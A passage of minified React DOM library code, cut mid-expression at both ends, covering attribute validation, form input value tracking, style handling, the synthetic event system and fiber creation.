kt=RegExp(`^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$`),At={},jt={};function Mt(e){return ke.call(jt,e)?!0:ke.call(At,e)?!1:kt.test(e)?jt[e]=!0:(At[e]=!0,!1)}function Nt(e,t,n){if(Mt(t)){if(n===null)e.removeAttribute(t);else{switch(typeof n){case`undefined`:case`function`:case`symbol`:e.removeAttribute(t);return;case`boolean`:var r=t.toLowerCase().slice(0,5);if(r!==`data-`&&r!==`aria-`){e.removeAttribute(t);return}}e.setAttribute(t,``+n)}}}function Pt(e,t,n){if(n===null)e.removeAttribute(t);else{switch(typeof n){case`undefined`:case`function`:case`symbol`:case`boolean`:e.removeAttribute(t);return}e.setAttribute(t,``+n)}}function Ft(e,t,n,r){if(r===null)e.removeAttribute(n);else{switch(typeof r){case`undefined`:case`function`:case`symbol`:case`boolean`:e.removeAttribute(n);return}e.setAttributeNS(t,n,``+r)}}function It(e){switch(typeof e){case`bigint`:case`boolean`:case`number`:case`string`:case`undefined`:return e;case`object`:return e;default:return``}}function Lt(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()===`input`&&(t===`checkbox`||t===`radio`)}function Rt(e,t,n){var r=Object.getOwnPropertyDescriptor(e.constructor.prototype,t);if(!e.hasOwnProperty(t)&&r!==void 0&&typeof r.get==`function`&&typeof r.set==`function`){var i=r.get,a=r.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return i.call(this)},set:function(e){n=``+e,a.call(this,e)}}),Object.defineProperty(e,t,{enumerable:r.enumerable}),{getValue:function(){return n},setValue:function(e){n=``+e},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function zt(e){if(!e._valueTracker){var t=Lt(e)?`checked`:`value`;e._valueTracker=Rt(e,t,``+e[t])}}function Bt(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r=``;return e&&(r=Lt(e)?e.checked?`true`:`false`:e.value),e=r,e!==n&&(t.setValue(e),!0)}function Vt(e){if(e||=typeof document<`u`?document:void 0,e===void 0)return null;try{return e.activeElement||e.body}catch{return e.body}}var Ht=/[\n"\\]/g;function Ut(e){return e.replace(Ht,function(e){return`\\`+e.charCodeAt(0).toString(16)+` `})}function Wt(e,t,n,r,i,a,o,s){e.name=``,o!=null&&typeof o!=`function`&&typeof o!=`symbol`&&typeof o!=`boolean`?e.type=o:e.removeAttribute(`type`),t==null?o!==`submit`&&o!==`reset`||e.removeAttribute(`value`):o===`number`?(t===0&&e.value===``||e.value!=t)&&(e.value=``+It(t)):e.value!==``+It(t)&&(e.value=``+It(t)),t==null?n==null?r!=null&&e.removeAttribute(`value`):Kt(e,o,It(n)):Kt(e,o,It(t)),i==null&&a!=null&&(e.defaultChecked=!!a),i!=null&&(e.checked=i&&typeof i!=`function`&&typeof i!=`symbol`),s!=null&&typeof s!=`function`&&typeof s!=`symbol`&&typeof s!=`boolean`?e.name=``+It(s):e.removeAttribute(`name`)}function Gt(e,t,n,r,i,a,o,s){if(a!=null&&typeof a!=`function`&&typeof a!=`symbol`&&typeof a!=`boolean`&&(e.type=a),t!=null||n!=null){if(!(a!==`submit`&&a!==`reset`||t!=null)){zt(e);return}n=n==null?``:``+It(n),t=t==null?n:``+It(t),s||t===e.value||(e.value=t),e.defaultValue=t}r??=i,r=typeof r!=`function`&&typeof r!=`symbol`&&!!r,e.checked=s?e.checked:!!r,e.defaultChecked=!!r,o!=null&&typeof o!=`function`&&typeof o!=`symbol`&&typeof o!=`boolean`&&(e.name=o),zt(e)}function Kt(e,t,n){t===`number`&&Vt(e.ownerDocument)===e||e.defaultValue===``+n||(e.defaultValue=``+n)}function qt(e,t,n,r){if(e=e.options,t){t={};for(var i=0;i<n.length;i++)t[`$`+n[i]]=!0;for(n=0;n<e.length;n++)i=t.hasOwnProperty(`$`+e[n].value),e[n].selected!==i&&(e[n].selected=i),i&&r&&(e[n].defaultSelected=!0)}else{for(n=``+It(n),t=null,i=0;i<e.length;i++){if(e[i].value===n){e[i].selected=!0,r&&(e[i].defaultSelected=!0);return}t!==null||e[i].disabled||(t=e[i])}t!==null&&(t.selected=!0)}}function Jt(e,t,n){if(t!=null&&(t=``+It(t),t!==e.value&&(e.value=t),n==null)){e.defaultValue!==t&&(e.defaultValue=t);return}e.defaultValue=n==null?``:``+It(n)}function Yt(e,t,n,r){if(t==null){if(r!=null){if(n!=null)throw Error(i(92));if(ce(r)){if(1<r.length)throw Error(i(93));r=r[0]}n=r}n??=``,t=n}n=It(t),e.defaultValue=n,r=e.textContent,r===n&&r!==``&&r!==null&&(e.value=r),zt(e)}function Xt(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&n.nodeType===3){n.nodeValue=t;return}}e.textContent=t}var Zt=new Set(`animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp`.split(` `));function Qt(e,t,n){var r=t.indexOf(`--`)===0;n==null||typeof n==`boolean`||n===``?r?e.setProperty(t,``):t===`float`?e.cssFloat=``:e[t]=``:r?e.setProperty(t,n):typeof n!=`number`||n===0||Zt.has(t)?t===`float`?e.cssFloat=n:e[t]=(``+n).trim():e[t]=n+`px`}function $t(e,t,n){if(t!=null&&typeof t!=`object`)throw Error(i(62));if(e=e.style,n!=null){for(var r in n)!n.hasOwnProperty(r)||t!=null&&t.hasOwnProperty(r)||(r.indexOf(`--`)===0?e.setProperty(r,``):r===`float`?e.cssFloat=``:e[r]=``);for(var a in t)r=t[a],t.hasOwnProperty(a)&&n[a]!==r&&Qt(e,a,r)}else for(var o in t)t.hasOwnProperty(o)&&Qt(e,o,t[o])}function en(e){if(e.indexOf(`-`)===-1)return!1;switch(e){case`annotation-xml`:case`color-profile`:case`font-face`:case`font-face-src`:case`font-face-uri`:case`font-face-format`:case`font-face-name`:case`missing-glyph`:return!1;default:return!0}}var tn=new Map([[`acceptCharset`,`accept-charset`],[`htmlFor`,`for`],[`httpEquiv`,`http-equiv`],[`crossOrigin`,`crossorigin`],[`accentHeight`,`accent-height`],[`alignmentBaseline`,`alignment-baseline`],[`arabicForm`,`arabic-form`],[`baselineShift`,`baseline-shift`],[`capHeight`,`cap-height`],[`clipPath`,`clip-path`],[`clipRule`,`clip-rule`],[`colorInterpolation`,`color-interpolation`],[`colorInterpolationFilters`,`color-interpolation-filters`],[`colorProfile`,`color-profile`],[`colorRendering`,`color-rendering`],[`dominantBaseline`,`dominant-baseline`],[`enableBackground`,`enable-background`],[`fillOpacity`,`fill-opacity`],[`fillRule`,`fill-rule`],[`floodColor`,`flood-color`],[`floodOpacity`,`flood-opacity`],[`fontFamily`,`font-family`],[`fontSize`,`font-size`],[`fontSizeAdjust`,`font-size-adjust`],[`fontStretch`,`font-stretch`],[`fontStyle`,`font-style`],[`fontVariant`,`font-variant`],[`fontWeight`,`font-weight`],[`glyphName`,`glyph-name`],[`glyphOrientationHorizontal`,`glyph-orientation-horizontal`],[`glyphOrientationVertical`,`glyph-orientation-vertical`],[`horizAdvX`,`horiz-adv-x`],[`horizOriginX`,`horiz-origin-x`],[`imageRendering`,`image-rendering`],[`letterSpacing`,`letter-spacing`],[`lightingColor`,`lighting-color`],[`markerEnd`,`marker-end`],[`markerMid`,`marker-mid`],[`markerStart`,`marker-start`],[`overlinePosition`,`overline-position`],[`overlineThickness`,`overline-thickness`],[`paintOrder`,`paint-order`],[`panose-1`,`panose-1`],[`pointerEvents`,`pointer-events`],[`renderingIntent`,`rendering-intent`],[`shapeRendering`,`shape-rendering`],[`stopColor`,`stop-color`],[`stopOpacity`,`stop-opacity`],[`strikethroughPosition`,`strikethrough-position`],[`strikethroughThickness`,`strikethrough-thickness`],[`strokeDasharray`,`stroke-dasharray`],[`strokeDashoffset`,`stroke-dashoffset`],[`strokeLinecap`,`stroke-linecap`],[`strokeLinejoin`,`stroke-linejoin`],[`strokeMiterlimit`,`stroke-miterlimit`],[`strokeOpacity`,`stroke-opacity`],[`strokeWidth`,`stroke-width`],[`textAnchor`,`text-anchor`],[`textDecoration`,`text-decoration`],[`textRendering`,`text-rendering`],[`transformOrigin`,`transform-origin`],[`underlinePosition`,`underline-position`],[`underlineThickness`,`underline-thickness`],[`unicodeBidi`,`unicode-bidi`],[`unicodeRange`,`unicode-range`],[`unitsPerEm`,`units-per-em`],[`vAlphabetic`,`v-alphabetic`],[`vHanging`,`v-hanging`],[`vIdeographic`,`v-ideographic`],[`vMathematical`,`v-mathematical`],[`vectorEffect`,`vector-effect`],[`vertAdvY`,`vert-adv-y`],[`vertOriginX`,`vert-origin-x`],[`vertOriginY`,`vert-origin-y`],[`wordSpacing`,`word-spacing`],[`writingMode`,`writing-mode`],[`xmlnsXlink`,`xmlns:xlink`],[`xHeight`,`x-height`]]),nn=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function rn(e){return nn.test(``+e)?`javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')`:e}function an(){}var on=null;function sn(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var cn=null,ln=null;function un(e){var t=xt(e);if(t&&(e=t.stateNode)){var n=e[ft]||null;a:switch(e=t.stateNode,t.type){case`input`:if(Wt(e,n.value,n.defaultValue,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name),t=n.name,n.type===`radio`&&t!=null){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll(`input[name="`+Ut(``+t)+`"][type="radio"]`),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var a=r[ft]||null;if(!a)throw Error(i(90));Wt(r,a.value,a.defaultValue,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name)}}for(t=0;t<n.length;t++)r=n[t],r.form===e.form&&Bt(r)}break a;case`textarea`:Jt(e,n.value,n.defaultValue);break a;case`select`:t=n.value,t!=null&&qt(e,!!n.multiple,t,!1)}}}var dn=!1;function fn(e,t,n){if(dn)return e(t,n);dn=!0;try{return e(t)}finally{if(dn=!1,(cn!==null||ln!==null)&&(bu(),cn&&(t=cn,e=ln,ln=cn=null,un(t),e)))for(t=0;t<e.length;t++)un(e[t])}}function pn(e,t){var n=e.stateNode;if(n===null)return null;var r=n[ft]||null;if(r===null)return null;n=r[t];a:switch(t){case`onClick`:case`onClickCapture`:case`onDoubleClick`:case`onDoubleClickCapture`:case`onMouseDown`:case`onMouseDownCapture`:case`onMouseMove`:case`onMouseMoveCapture`:case`onMouseUp`:case`onMouseUpCapture`:case`onMouseEnter`:(r=!r.disabled)||(e=e.type,r=e!==`button`&&e!==`input`&&e!==`select`&&e!==`textarea`),e=!r;break a;default:e=!1}if(e)return null;if(n&&typeof n!=`function`)throw Error(i(231,t,typeof n));return n}var mn=!(typeof window>`u`||window.document===void 0||window.document.createElement===void 0),hn=!1;if(mn)try{var gn={};Object.defineProperty(gn,"passive",{get:function(){hn=!0}}),window.addEventListener(`test`,gn,gn),window.removeEventListener(`test`,gn,gn)}catch{hn=!1}var _n=null,vn=null,yn=null;function bn(){if(yn)return yn;var e,t=vn,n=t.length,r,i=`value`in _n?_n.value:_n.textContent,a=i.length;for(e=0;e<n&&t[e]===i[e];e++);var o=n-e;for(r=1;r<=o&&t[n-r]===i[a-r];r++);return yn=i.slice(e,1<r?1-r:void 0)}function xn(e){var t=e.keyCode;return`charCode`in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Sn(){return!0}function Cn(){return!1}function wn(e){function t(t,n,r,i,a){for(var o in this._reactName=t,this._targetInst=r,this.type=n,this.nativeEvent=i,this.target=a,this.currentTarget=null,e)e.hasOwnProperty(o)&&(t=e[o],this[o]=t?t(i):i[o]);return this.isDefaultPrevented=(i.defaultPrevented==null?!1===i.returnValue:i.defaultPrevented)?Sn:Cn,this.isPropagationStopped=Cn,this}return m(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var e=this.nativeEvent;e&&(e.preventDefault?e.preventDefault():typeof e.returnValue!=`unknown`&&(e.returnValue=!1),this.isDefaultPrevented=Sn)},stopPropagation:function(){var e=this.nativeEvent;e&&(e.stopPropagation?e.stopPropagation():typeof e.cancelBubble!=`unknown`&&(e.cancelBubble=!0),this.isPropagationStopped=Sn)},persist:function(){},isPersistent:Sn}),t}var Tn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},En=wn(Tn),Dn=m({},Tn,{view:0,detail:0}),On=wn(Dn),kn,An,jn,Mn=m({},Dn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Un,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return`movementX`in e?e.movementX:(e!==jn&&(jn&&e.type===`mousemove`?(kn=e.screenX-jn.screenX,An=e.screenY-jn.screenY):An=kn=0,jn=e),kn)},movementY:function(e){return`movementY`in e?e.movementY:An}}),Nn=wn(Mn),Pn=wn(m({},Mn,{dataTransfer:0})),Fn=wn(m({},Dn,{relatedTarget:0})),In=wn(m({},Tn,{animationName:0,elapsedTime:0,pseudoElement:0})),Ln=wn(m({},Tn,{clipboardData:function(e){return`clipboardData`in e?e.clipboardData:window.clipboardData}})),Rn=wn(m({},Tn,{data:0})),zn={Esc:`Escape`,Spacebar:` `,Left:`ArrowLeft`,Up:`ArrowUp`,Right:`ArrowRight`,Down:`ArrowDown`,Del:`Delete`,Win:`OS`,Menu:`ContextMenu`,Apps:`ContextMenu`,Scroll:`ScrollLock`,MozPrintableKey:`Unidentified`},Bn={8:`Backspace`,9:`Tab`,12:`Clear`,13:`Enter`,16:`Shift`,17:`Control`,18:`Alt`,19:`Pause`,20:`CapsLock`,27:`Escape`,32:` `,33:`PageUp`,34:`PageDown`,35:`End`,36:`Home`,37:`ArrowLeft`,38:`ArrowUp`,39:`ArrowRight`,40:`ArrowDown`,45:`Insert`,46:`Delete`,112:`F1`,113:`F2`,114:`F3`,115:`F4`,116:`F5`,117:`F6`,118:`F7`,119:`F8`,120:`F9`,121:`F10`,122:`F11`,123:`F12`,144:`NumLock`,145:`ScrollLock`,224:`Meta`},Vn={Alt:`altKey`,Control:`ctrlKey`,Meta:`metaKey`,Shift:`shiftKey`};function Hn(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=Vn[e])?!!t[e]:!1}function Un(){return Hn}var Wn=wn(m({},Dn,{key:function(e){if(e.key){var t=zn[e.key]||e.key;if(t!==`Unidentified`)return t}return e.type===`keypress`?(e=xn(e),e===13?`Enter`:String.fromCharCode(e)):e.type===`keydown`||e.type===`keyup`?Bn[e.keyCode]||`Unidentified`:``},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Un,charCode:function(e){return e.type===`keypress`?xn(e):0},keyCode:function(e){return e.type===`keydown`||e.type===`keyup`?e.keyCode:0},which:function(e){return e.type===`keypress`?xn(e):e.type===`keydown`||e.type===`keyup`?e.keyCode:0}})),Gn=wn(m({},Mn,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0})),Kn=wn(m({},Dn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Un})),qn=wn(m({},Tn,{propertyName:0,elapsedTime:0,pseudoElement:0})),Jn=wn(m({},Mn,{deltaX:function(e){return`deltaX`in e?e.deltaX:`wheelDeltaX`in e?-e.wheelDeltaX:0},deltaY:function(e){return`deltaY`in e?e.deltaY:`wheelDeltaY`in e?-e.wheelDeltaY:`wheelDelta`in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0})),Yn=wn(m({},Tn,{newState:0,oldState:0})),Xn=[9,13,27,32],Zn=mn&&`CompositionEvent`in window,Qn=null;mn&&`documentMode`in document&&(Qn=document.documentMode);var $n=mn&&`TextEvent`in window&&!Qn,er=mn&&(!Zn||Qn&&8<Qn&&11>=Qn),tr=` `,nr=!1;function rr(e,t){switch(e){case`keyup`:return Xn.indexOf(t.keyCode)!==-1;case`keydown`:return t.keyCode!==229;case`keypress`:case`mousedown`:case`focusout`:return!0;default:return!1}}function ir(e){return e=e.detail,typeof e==`object`&&`data`in e?e.data:null}var ar=!1;function or(e,t){switch(e){case`compositionend`:return ir(t);case`keypress`:return t.which===32?(nr=!0,tr):null;case`textInput`:return e=t.data,e===tr&&nr?null:e;default:return null}}function sr(e,t){if(ar)return e===`compositionend`||!Zn&&rr(e,t)?(e=bn(),yn=vn=_n=null,ar=!1,e):null;switch(e){case`paste`:return null;case`keypress`:if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case`compositionend`:return er&&t.locale!==`ko`?null:t.data;default:return null}}var cr={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function lr(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t===`input`?!!cr[e.type]:t===`textarea`}function ur(e,t,n,r){cn?ln?ln.push(r):ln=[r]:cn=r,t=Ed(t,`onChange`),0<t.length&&(n=new En(`onChange`,`change`,null,n,r),e.push({event:n,listeners:t}))}var dr=null,fr=null;function pr(e){yd(e,0)}function mr(e){if(Bt(St(e)))return e}function hr(e,t){if(e===`change`)return t}var gr=!1;if(mn){var _r;if(mn){var vr=`oninput`in document;if(!vr){var yr=document.createElement(`div`);yr.setAttribute(`oninput`,`return;`),vr=typeof yr.oninput==`function`}_r=vr}else _r=!1;gr=_r&&(!document.documentMode||9<document.documentMode)}function br(){dr&&(dr.detachEvent(`onpropertychange`,xr),fr=dr=null)}function xr(e){if(e.propertyName===`value`&&mr(fr)){var t=[];ur(t,fr,e,sn(e)),fn(pr,t)}}function Sr(e,t,n){e===`focusin`?(br(),dr=t,fr=n,dr.attachEvent(`onpropertychange`,xr)):e===`focusout`&&br()}function Cr(e){if(e===`selectionchange`||e===`keyup`||e===`keydown`)return mr(fr)}function wr(e,t){if(e===`click`)return mr(t)}function Tr(e,t){if(e===`input`||e===`change`)return mr(t)}function Er(e,t){return e===t&&(e!==0||1/e==1/t)||e!==e&&t!==t}var Dr=typeof Object.is==`function`?Object.is:Er;function Or(e,t){if(Dr(e,t))return!0;if(typeof e!=`object`||!e||typeof t!=`object`||!t)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var i=n[r];if(!ke.call(t,i)||!Dr(e[i],t[i]))return!1}return!0}function kr(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Ar(e,t){var n=kr(e);e=0;for(var r;n;){if(n.nodeType===3){if(r=e+n.textContent.length,e<=t&&r>=t)return{node:n,offset:t-e};e=r}a:{for(;n;){if(n.nextSibling){n=n.nextSibling;break a}n=n.parentNode}n=void 0}n=kr(n)}}function jr(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?jr(e,t.parentNode):`contains`in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Mr(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=Vt(e.document);t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href==`string`}catch{n=!1}if(n)e=t.contentWindow;else break;t=Vt(e.document)}return t}function Nr(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t===`input`&&(e.type===`text`||e.type===`search`||e.type===`tel`||e.type===`url`||e.type===`password`)||t===`textarea`||e.contentEditable===`true`)}var Pr=mn&&`documentMode`in document&&11>=document.documentMode,Fr=null,Ir=null,Lr=null,Rr=!1;function zr(e,t,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Rr||Fr==null||Fr!==Vt(r)||(r=Fr,`selectionStart`in r&&Nr(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),Lr&&Or(Lr,r)||(Lr=r,r=Ed(Ir,`onSelect`),0<r.length&&(t=new En(`onSelect`,`select`,null,t,n),e.push({event:t,listeners:r}),t.target=Fr)))}function Br(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n[`Webkit`+e]=`webkit`+t,n[`Moz`+e]=`moz`+t,n}var Vr={animationend:Br(`Animation`,`AnimationEnd`),animationiteration:Br(`Animation`,`AnimationIteration`),animationstart:Br(`Animation`,`AnimationStart`),transitionrun:Br(`Transition`,`TransitionRun`),transitionstart:Br(`Transition`,`TransitionStart`),transitioncancel:Br(`Transition`,`TransitionCancel`),transitionend:Br(`Transition`,`TransitionEnd`)},Hr={},Ur={};mn&&(Ur=document.createElement(`div`).style,`AnimationEvent`in window||(delete Vr.animationend.animation,delete Vr.animationiteration.animation,delete Vr.animationstart.animation),`TransitionEvent`in window||delete Vr.transitionend.transition);function Wr(e){if(Hr[e])return Hr[e];if(!Vr[e])return e;var t=Vr[e],n;for(n in t)if(t.hasOwnProperty(n)&&n in Ur)return Hr[e]=t[n];return e}var Gr=Wr(`animationend`),Kr=Wr(`animationiteration`),P=Wr(`animationstart`),qr=Wr(`transitionrun`),Jr=Wr(`transitionstart`),Yr=Wr(`transitioncancel`),Xr=Wr(`transitionend`),Zr=new Map,Qr=`abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel`.split(` `);Qr.push(`scrollEnd`);function $r(e,t){Zr.set(e,t),Dt(t,[e])}var ei=typeof reportError==`function`?reportError:function(e){if(typeof window==`object`&&typeof window.ErrorEvent==`function`){var t=new window.ErrorEvent(`error`,{bubbles:!0,cancelable:!0,message:typeof e==`object`&&e&&typeof e.message==`string`?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process==`object`&&typeof process.emit==`function`){process.emit(`uncaughtException`,e);return}console.error(e)},ti=[],ni=0,ri=0;function ii(){for(var e=ni,t=ri=ni=0;t<e;){var n=ti[t];ti[t++]=null;var r=ti[t];ti[t++]=null;var i=ti[t];ti[t++]=null;var a=ti[t];if(ti[t++]=null,r!==null&&i!==null){var o=r.pending;o===null?i.next=i:(i.next=o.next,o.next=i),r.pending=i}a!==0&&ci(n,i,a)}}function ai(e,t,n,r){ti[ni++]=e,ti[ni++]=t,ti[ni++]=n,ti[ni++]=r,ri|=r,e.lanes|=r,e=e.alternate,e!==null&&(e.lanes|=r)}function oi(e,t,n,r){return ai(e,t,n,r),li(e)}function si(e,t){return ai(e,null,null,t),li(e)}function ci(e,t,n){e.lanes|=n;var r=e.alternate;r!==null&&(r.lanes|=n);for(var i=!1,a=e.return;a!==null;)a.childLanes|=n,r=a.alternate,r!==null&&(r.childLanes|=n),a.tag===22&&(e=a.stateNode,e===null||e._visibility&1||(i=!0)),e=a,a=a.return;return e.tag===3?(a=e.stateNode,i&&t!==null&&(i=31-Ue(n),e=a.hiddenUpdates,r=e[i],r===null?e[i]=[t]:r.push(t),t.lane=n|536870912),a):null}function li(e){if(50<du)throw du=0,fu=null,Error(i(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var ui={};function di(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function fi(e,t,n,r){return new di(e,t,n,r)}function pi(e){return e=e.prototype,!(!e||!e.isReactComponent)}function mi(e,t){var n=e.alternate;return n===null?(n=fi(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=e.flags&65011712,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n.refCleanup=e.refCleanup,n}function hi(e,t){e.flags&=65011714;var n=e.alternate;return n===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=n.childLanes,e.lanes=n.lanes,e.child=n.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=n.memoizedProps,e.memoizedState=n.memoizedState,e.updateQueue=n.updateQueue,e.type=n.type,t=n.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function gi(e,t,n,r,a,o){var s=0;if(r=e,typeof e==`function`)pi(e)&&(s=1);else if(typeof e==`string`)s=Uf(e,n,me.current)?26:e===`html`||e===`head`||e===`body`?27:5;else a:switch(e){case ne:return e=fi(31,n,t,a),e.elementType=ne,e.lanes=o,e;case y:return _i(n.children,a,o,t);case b:s=8,a|=24;break;case x:return e=fi(12,n,t,a|2),e.elementType=x,e.lanes=o,e;case w:return e=fi(13,n,t,a),e.elementType=w,e.lanes=o,e;case T:return e=fi(19,n,t,a),e.elementType=T,e.lanes=o,e;default:if(typeof e==`object`&&e)switch(e.$$typeof){case S:s=10;break a;case ee:s=9;break a;case C:s=11;break a;case te:s=14;break a;case E:s=16,r=null;break a}s=29,n=Error(i(130,e===null?`null`:typeof e,``)),r=null}return t=fi(s,n,t,a),t.elementType=e,t.type=r,t.lanes=o,t}function _i(e,t,n,r){return e=fi(7,e,r,t),e.lanes=n,e}function vi(e,t,n){return e=fi(6,e,null,t),e.lanes=n,e}function yi(e){var t=fi(18,null,null,0);return t.stateNode=e,t}function bi(e,t,n){return t=fi(4,e.children===null?[]:e.children,e.key,t),t.lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var xi=new WeakMap;function Si(e,t){if(typeof e==`object`&&e){var n=xi.get(e);return n===void 0?(t={value:e,source:t,stack:Oe(t)},xi.set(e,t),t):n}return{value:e,source:t,stack:Oe(t)}}var Ci=[],wi=0,Ti=null,Ei=0,Di=[],Oi=0,ki=null,Ai=1,ji=``;function Mi(e,t){Ci[wi++]=Ei,Ci[wi++]=Ti,Ti=e,Ei=t}function Ni(e,t,n){Di[Oi++]=Ai,Di[Oi++]=ji,Di[Oi++]=ki,ki=e;var r=Ai;e=ji;var i=32-Ue(r)-1;r&=~(1<<i),n+=1;var a=32-Ue(t)+i;if(30<a){var o=i-i%5;a=(r&(1<<o)-1).toString(32),r>>=o,i-=o,Ai=1<<32-Ue(t)+i|n<<i|r,ji=a+e}else Ai=1<<a|n<<i|r,ji=e}function Pi(e){e.return!==null&&(Mi(e,1),Ni(e,1,0))}function Fi(e){for(;e===Ti;)Ti=Ci[--wi],Ci[wi]=null,Ei=Ci[--wi],Ci[wi]=null;for(;e===ki;)ki=Di[--Oi],Di[Oi]=null,ji=Di[--Oi],Di[Oi]=null,Ai=Di[--Oi],Di[Oi]=null}function 